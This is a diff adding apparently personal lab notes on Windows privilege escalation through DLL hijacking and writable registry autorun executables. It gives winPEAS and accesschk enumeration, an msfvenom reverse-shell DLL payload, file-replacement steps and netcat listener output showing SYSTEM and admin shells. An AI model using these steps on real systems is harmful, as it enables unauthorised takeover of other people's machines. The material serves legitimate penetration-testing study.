@@ -659,5 +659,203 @@ nt authority\system
 
 ### 7.5 DLL hijacking
 
+- often a service will try to load functionality from a library called a DLL(dynamic link library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it.
+- If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.
+
+- A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in.
+- unfortunately, initial detection of vulnerable services is difficult and often the entire process is very manual.
+
+
+- From winpeas output
+```bash
+dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Stopped
+```
+- Check access rights on this service
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -uvqc user dllsvc
+R  dllsvc
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+```
+
+- confirming the running service
+```bash
+C:\PrivEsc>sc qc dllsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: dllsvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : DLL Hijack Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+
+> Service runs with System privileges
+
+```bash
+  [+] Checking write permissions in PATH folders (DLL Hijacking)()
+   [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+    C:\Windows\system32
+    C:\Windows
+    C:\Windows\System32\Wbem
+    C:\Windows\System32\WindowsPowerShell\v1.0\
+    C:\Windows\System32\OpenSSH\
+    C:\ProgramData\chocolatey\bin
+    C:\Program Files\Puppet Labs\Puppet\bin
+    C:\Users\IEUser\AppData\Local\Microsoft\WindowsApps
+    (DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles] # This one
+
+```
+
+- Now generate a reverse shell dll using msfvenom
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.37.128 LPORT=9001 -f dll -o hijackme.dll
+```
+- Place the dll in `Temp` directory
+```bash
+C:\PrivEsc>copy hijackme.dll C:\Temp
+        1 file(s) copied.
+```
+- Start the listener on kali nad start the service(stop and start)
+
+```bash
+C:\PrivEsc>net start dllsvc
+The DLL Hijack Service service is starting....
+```
+__Result__
+
+```bash
+└─$ sudo nc -lvnp  9001 
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 52307
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+
+## Registry
+
+__AutoRuns__
+
+- Windows can be configured to run commands at startup, with elevated privileges.
+- These `Autoruns` are configured in the Registry.
+- If you are able to write to an `Autorun` executable, and are able to restart the system(or wait for it to be restarted) you may be able to escalate privileges.
+
+- Command
+```bash
+winPEAsany.exe quiet applicationsinfo
+```
+Winpeas sample output
+
+```bash
+
+  [+] Autorun Applications(T1010)
+   [?] Check if you can modify other users AutoRuns binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\SecurityHealthSystray.exe
+    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+   =================================================================================================
+
+    Folder: C:\BGinfo\Bginfo.exe\accepteula\ic:\bginfo\bgconfig.bgi
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+    File: C:\BGinfo\Bginfo.exe /accepteula /ic:\bginfo\bgconfig.bgi /timer:0 (Unquoted and Space detected)
+    FilePerms: Authenticated Users [WriteData/CreateFiles]
+    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+   =================================================================================================
+
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\vm3dservice.exe -u
+    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+   =================================================================================================
+
+    Folder: C:\Program Files\VMware\VMware Tools
+    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
+    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+   =================================================================================================
+
+    Folder: C:\Program Files\Autorun Program
+    File: C:\Program Files\Autorun Program\program.exe
+    FilePerms: Everyone [AllAccess]  # this one
+    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+```
+
+- Query the `RegPath` (- We can verify this manually (make sure to check all the executable)
+```bash
+C:\PrivEsc>reg query HKLM\SOFTWARE\Microsoft\Windows\Currentversion\Run
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Currentversion\Run
+    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
+    bginfo    REG_SZ    C:\BGinfo\Bginfo.exe /accepteula /ic:\bginfo\bgconfig.bgi /timer:0
+    VMware VM3DService Process    REG_SZ    "C:\Windows\system32\vm3dservice.exe" -u
+    VMware User Process    REG_SZ    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
+```
+
+- Checking only the one that winpeas indicated
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+
+AccessChk v4.02 - Check access of files, keys, objects, processes or services
+Copyright (C) 2006-2007 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Program Files\Autorun Program\program.exe
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW Everyone
+        FILE_ALL_ACCESS
+  RW NT AUTHORITY\SYSTEM
+        FILE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        FILE_ALL_ACCESS
+  RW BUILTIN\Users
+        FILE_ALL_ACCESS
+```
+> User has RW access (Full access)
+
+- To exploit overwrite the `program.exe` executables with another file(our reverse shell) and restart the windows machine.
+
+- Make a backup first, then copy the reverse_shell executable.
+- Setup the listener and restart the windows machine
+- Log in as administrator if the shell does'nt connect
+
+```bash
+C:\PrivEsc>copy  "C:\Program Files\Autorun Program\program.exe" C:\Temp
+        1 file(s) copied.
+
+C:\PrivEsc>copy /Y reverse_9001.exe "C:\Program Files\Autorun Program\program.exe"
+        1 file(s) copied.
+```
+__Result__
+
+```bash
+──(kali㉿kali)-[~/windows-priv-esc]
+└─$ sudo nc -lvnp  9001                                                                                                                                                                   6 ⚙
+[sudo] password for kali: 
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 49723
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+msedgewin10\admin
+```
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
